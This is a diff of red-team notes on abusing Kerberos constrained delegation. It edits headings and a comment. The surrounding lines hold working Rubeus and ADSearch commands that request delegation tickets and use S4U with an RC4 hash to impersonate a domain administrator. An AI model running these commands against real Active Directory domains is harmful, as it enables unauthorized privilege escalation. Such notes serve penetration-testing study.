@@ -286,10 +286,10 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 ![Screenshot 2024-06-18 at 20-42-44 Kerberos Constrained Delegation Red Team Notes](https://github.com/kiro6/penetration-testing-notes/assets/57776872/dfc45db7-65f4-412f-b58f-8b904ff5c606)
 
 
-### Delegation User
+### Delegation form User
 ```shell
 # if you are using the Delegation service (in a shell of context of the service) 
-## request a delegation TGT for the user
+## request a delegation TGT for the user or computer
 .\Rubeus.exe tgtdeleg
 .\Rubeus.exe asktgt /user:<username> /password:<password> /domain:<>domain /outfile:ticket.kirbi
 
@@ -302,7 +302,7 @@ Rubeus.exe s4u /ticket:<ticket file> /impersonateuser:administrator /domain:offe
 .\Rubeus.exe hash /password:Slavi123
 .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /altservice:CIFS,HOST,LDAP /dc:dc01.offense.local /ptt
 ```
-### Delegation System/Machine
+### Delegation from System/Machine
 ```shell
 # if u are in a shell of context of machine account or in other words you have a SYSTEM level privileges on a machine
 
